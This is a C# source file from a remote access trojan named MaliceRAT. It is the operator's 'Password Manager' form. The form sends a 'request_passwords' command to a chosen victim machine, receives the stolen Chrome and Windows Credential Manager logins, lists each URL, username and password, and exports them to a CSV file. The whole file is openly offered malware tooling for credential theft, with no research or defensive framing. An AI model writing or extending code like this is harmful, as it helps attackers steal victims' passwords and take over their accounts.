using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using MaliceRAT.RatServer;
using System.IO;
using System.Text;

namespace MaliceRAT.RatUI
{
    public partial class PasswordManagerForm : Form
    {
        #region Variables
        private readonly int victimId;
        private readonly Server server;
        #endregion

        #region Constructor
        public PasswordManagerForm(int victimId, Server server)
        {
            InitializeComponent();
            this.victimId = victimId;
            this.server = server;

            server.GetVictimById(victimId).Send(new { type = "request_passwords" });
            server.MessageReceived += Server_MessageReceived;

            titleLabel.Text = $"Password Manager [{server.GetVictimById(victimId).User}]";
        }

        private void Server_MessageReceived(Victim victim, dynamic message)
        {
            if (victim.Id == victimId)
            {
                if (message["type"] == "passwords")
                {
                    var passwordData = new JavaScriptSerializer().Deserialize<PasswordData>(message["data"].ToString());

                    UpdatePasswordTable(gunaChromePasswordsTable, passwordData.chrome);
                    UpdatePasswordTable(gunaWCMPasswordsTable, passwordData.wcm);
                }
            }
        }

        private void UpdatePasswordTable(DataGridView table, List<CredentialModel> passwords)
        {
            table.Invoke((MethodInvoker)delegate {
                table.Rows.Clear();
                foreach (var password in passwords)
                {
                    table.Rows.Add(password.Url, password.Username, password.Password);
                }
            });
        }
        #endregion

        #region Helper Classes
        public class CredentialModel
        {
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
        }

        public class PasswordData
        {
            public List<CredentialModel> chrome { get; set; }
            public List<CredentialModel> wcm { get; set; }
        }
        #endregion

        private void exportAsCsvButton_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "CSV files (*.csv)|*.csv";
                saveFileDialog.FilterIndex = 1;
                saveFileDialog.RestoreDirectory = true;

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog.FileName;
                    using (StreamWriter sw = new StreamWriter(filePath, false, Encoding.UTF8))
                    {
                        sw.WriteLine("Source,URL,Username,Password");

                        // Export Chrome passwords
                        foreach (DataGridViewRow row in gunaChromePasswordsTable.Rows)
                        {
                            sw.WriteLine($"Chrome,{row.Cells[0].Value},{row.Cells[1].Value},{row.Cells[2].Value}");
                        }

                        // Export WCM passwords
                        foreach (DataGridViewRow row in gunaWCMPasswordsTable.Rows)
                        {
                            sw.WriteLine($"WCM,{row.Cells[0].Value},{row.Cells[1].Value},{row.Cells[2].Value}");
                        }
                    }

                    MessageBox.Show("Passwords exported successfully!", "Export Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
    }
}